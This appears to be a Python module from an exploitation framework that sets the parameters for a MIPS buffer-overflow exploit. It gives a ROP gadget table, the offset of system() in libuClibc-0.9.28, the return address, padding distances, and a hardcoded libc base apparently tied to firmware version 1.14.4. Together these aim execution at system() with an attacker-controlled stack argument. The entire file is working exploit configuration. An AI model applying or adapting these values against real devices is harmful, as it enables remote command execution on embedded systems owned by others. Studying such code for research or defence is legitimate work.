from . import overflow


class Overflow(overflow.Overflow):
    def __init__(self):
        """
        ----------------------------------------------------------------
        | Gadget Name | Gadget Offset | Gadget Summary                 |
        ----------------------------------------------------------------
        | ROP1        | 0x00050DE4    | addiu $s2, $sp, 0x1E8+var_F8   |
        |             |               | move $a0, $s2                  |
        |             |               | move $t9, $s0                  |
        |             |               | jalr $t9                       |
        ----------------------------------------------------------------
        """
        super(Overflow, self).__init__()
        self.padding_after_ra = 0x4
        self.distance_to_s0 = 0x10
        self.s0 = 0x4BD20  # Offset of system in libuClibc-0.9.28.s0
        self.ra = 0x50DE4

        self.rop_padding = 0x1E8 - 0xF8

    def _1_14_4(self):
        self.libc_base = 0x2AAEF000
